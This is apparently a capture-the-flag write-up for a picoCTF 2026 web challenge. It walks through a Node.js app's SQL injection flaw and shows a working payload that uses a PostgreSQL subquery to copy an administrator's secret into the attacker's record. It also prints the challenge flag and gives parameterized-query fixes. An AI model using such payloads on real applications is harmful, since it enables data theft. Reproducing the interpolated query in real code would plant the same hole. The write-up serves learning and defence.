# Secret Box — picoCTF 2026

## Challenge Information

| Field         | Details              |
| ------------- | -------------------- |
| Challenge     | Secret Box           |
| Category      | Web Exploitation     |
| Difficulty    | Medium               |
| Platform      | picoCTF              |
| Vulnerability | SQL Injection        |
| Database      | PostgreSQL           |
| Web Framework | Express.js / Node.js |

---

## 1. Challenge Description

The challenge provides a web application called **Secret Vault**.

The application allows authenticated users to:

* Create an account
* Log in
* Store secrets
* View their own secrets

The challenge description suggests that an administrator has a secret that needs to be uncovered.

The source code was provided with the challenge, so source-code analysis was used to identify the vulnerability.

---

# 2. Initial Reconnaissance

The application contained:

```text
/
├── Login
├── Sign Up
└── Secret Vault
```

After creating an account and logging in, the application provided a **Create New Secret** function.

The authentication mechanism used a cookie:

```text
auth_token
```

The server looked up this token in the `tokens` table and obtained the associated `user_id`.

---

# 3. Authentication Analysis

The authentication middleware contained:

```js
const cookies = getCookies(req.headers.cookie);
const token = cookies.auth_token;
```

The token was then checked against the database:

```js
const query = await db.raw(
    `SELECT * FROM tokens WHERE id = ? AND expired_at > NOW()`,
    [token]
);
```

If the token was valid:

```js
req.userId = query.rows[0].user_id;
```

Therefore, the authentication flow was:

```text
auth_token cookie
       ↓
tokens table
       ↓
user_id
       ↓
req.userId
```

There was no need to attack the authentication mechanism because a normal user account could be created.

---

# 4. Database Analysis

The database schema contained three relevant tables:

```text
users
 ├── id
 ├── username
 └── password

tokens
 ├── id
 ├── user_id
 └── expired_at

secrets
 ├── id
 ├── owner_id
 └── content
```

The administrator had a known UUID in the source:

```text
e2a66f7d-2ce6-4861-b4aa-be8e069601cb
```

The initial database contained:

```sql
INSERT INTO secrets(owner_id, content)
VALUES (
    'e2a66f7d-2ce6-4861-b4aa-be8e069601cb',
    'picoCTF{fake_flag}'
);
```

However, this was only a placeholder.

During initialization, the application replaced it with the actual flag:

```js
await db('secrets')
    .where({
        owner_id: 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb'
    })
    .update({
        content: process.env.FLAG
    });
```

Therefore:

```text
fake_flag
    ↓
initdb()
    ↓
process.env.FLAG
    ↓
real flag
```

---

# 5. Vulnerability Discovery

The important code was the secret creation endpoint:

```js
app.post('/secrets/create', authMiddleware, async (req, res) => {
    const userId = req.userId;

    if (!userId) {
        res.clearCookie('auth_token');
        return res.redirect('/');
    }

    const content = req.body.content;

    const query = await db.raw(
        `INSERT INTO secrets(owner_id, content)
         VALUES ('${userId}', '${content}')`
    );

    return res.redirect('/');
});
```

The problem was:

```js
'${content}'
```

The user's input was directly inserted into the SQL query.

---

# 6. Why This Is SQL Injection

Suppose the user enters:

```text
hello
```

The server constructs:

```sql
INSERT INTO secrets(owner_id, content)
VALUES ('OUR_USER_ID', 'hello');
```

This is normal.

But an attacker can provide SQL syntax instead of ordinary text.

The application does not use a parameter for `content`.

Therefore:

```text
User input
     ↓
${content}
     ↓
SQL query string
     ↓
PostgreSQL
```

The database can interpret parts of the user's input as SQL.

---

# 7. Exploit Logic

The goal was not to become the administrator.

Instead, the objective was to make the database retrieve the administrator's secret and insert the result into a secret owned by our account.

The administrator's ID was:

```text
e2a66f7d-2ce6-4861-b4aa-be8e069601cb
```

The SQL query needed to retrieve the admin's secret was:

```sql
SELECT content
FROM secrets
WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb'
```

PostgreSQL supports the `||` operator for string concatenation.

For example:

```sql
'hello' || 'world'
```

produces:

```text
helloworld
```

Therefore, the input could use a subquery and concatenation to retrieve the admin's secret.

Payload:

```text
x' || (SELECT content FROM secrets WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '
```

---

# 8. How the Payload Changes the SQL

The application originally generates:

```sql
INSERT INTO secrets(owner_id, content)
VALUES ('OUR_USER_ID', '${content}');
```

After inserting the payload, the query becomes conceptually:

```sql
INSERT INTO secrets(owner_id, content)
VALUES (
    'OUR_USER_ID',
    'x' ||
    (
        SELECT content
        FROM secrets
        WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb'
    )
    || ''
);
```

The important section is:

```sql
SELECT content
FROM secrets
WHERE owner_id = 'ADMIN_UUID'
```

This retrieves the administrator's secret.

Then:

```sql
'x' || ADMIN_SECRET || ''
```

concatenates the result into a string.

The resulting value is inserted into **our** secret.

---

# 9. Exploit Flow

The complete attack was:

```text
Create normal account
        ↓
Login
        ↓
Receive auth_token
        ↓
Access /secrets/create
        ↓
Submit SQL injection payload
        ↓
PostgreSQL executes subquery
        ↓
Retrieve admin's secret
        ↓
Insert result into our secret
        ↓
Return to /
        ↓
Read our secret
        ↓
FLAG
```

The flag obtained was:

```text
picoCTF{sq1_1nject10n_a8db399d}
```

---

# 10. Why Authentication Wasn't Bypassed

An important observation is that the attack **did not bypass authentication**.

We had a legitimate account and a legitimate session.

The vulnerability was instead in the database query used when creating a secret.

The application correctly restricted the normal secret retrieval:

```js
const query = await db.raw(
    `SELECT * FROM secrets WHERE owner_id = ?`,
    [userId]
);
```

The problem was that the application subsequently allowed user-controlled data to become SQL syntax in the `INSERT` statement.

---

# 11. Failed / Unnecessary Approaches

### Admin password attack

The source contained:

```text
admin
fake_password
```

but this was not the real password.

`initdb()` replaced it with:

```js
process.env.USERPASSWORD
```

Therefore, attempting to log in directly as the administrator using `fake_password` would not work.

### Token manipulation

The `auth_token` was a database-generated UUID.

The middleware checked:

```sql
SELECT * FROM tokens
WHERE id = ?
AND expired_at > NOW()
```

So simply changing the cookie to the admin UUID would not authenticate us.

The SQL injection was the useful attack path.

---

# 12. Secure Implementation

The vulnerable implementation was:

```js
await db.raw(
    `INSERT INTO secrets(owner_id, content)
     VALUES ('${userId}', '${content}')`
);
```

A parameterized version would be:

```js
await db.raw(
    `INSERT INTO secrets(owner_id, content)
     VALUES (?, ?)`,
    [userId, content]
);
```

An even cleaner Knex implementation is:

```js
await db('secrets').insert({
    owner_id: userId,
    content: content
});
```

Now the user's input is treated as **data**, not executable SQL.

If someone submits:

```text
' || (SELECT content FROM secrets ...) || '
```

the database stores that as ordinary text instead of executing the `SELECT`.

---

# 13. Root Cause

The root cause was:

> **Unsanitized user-controlled input was concatenated directly into a SQL query.**

Specifically:

```js
`${content}`
```

was inserted directly into:

```sql
INSERT INTO secrets(...)
VALUES (...);
```

This allowed an attacker to escape the intended string and introduce SQL expressions.

---

# 14. Security Lessons

### For developers

Always use:

* Parameterized queries
* Prepared statements
* ORM query builders
* Proper authorization checks
* Least-privilege database accounts

Avoid:

```js
`SELECT * FROM users WHERE name = '${username}'`
```

Prefer:

```js
db.raw(
    `SELECT * FROM users WHERE name = ?`,
    [username]
)
```

or the ORM's parameterized API.

### For CTFs

When source code is provided, look for:

```text
User input
    ↓
Database query
    ↓
String concatenation
```

Especially search for:

```text
db.raw(...)
query(...)
SELECT ...
INSERT ...
UPDATE ...
DELETE ...
${...}
```

That combination is a strong SQL injection indicator.

---

## 15. Key Takeaway

The most important thing I learned from this challenge:

```text
${content}
```

**is not inherently dangerous.**

The danger comes from using the resulting value to construct SQL:

```text
SQL + untrusted input
       ↓
string concatenation
       ↓
SQL Injection
```

Parameterization changes the relationship:

```text
SQL statement + parameter
       ↓
database
       ↓
input remains DATA
```

**Flag:** `picoCTF{sq1_1nject10n_a8db399d}`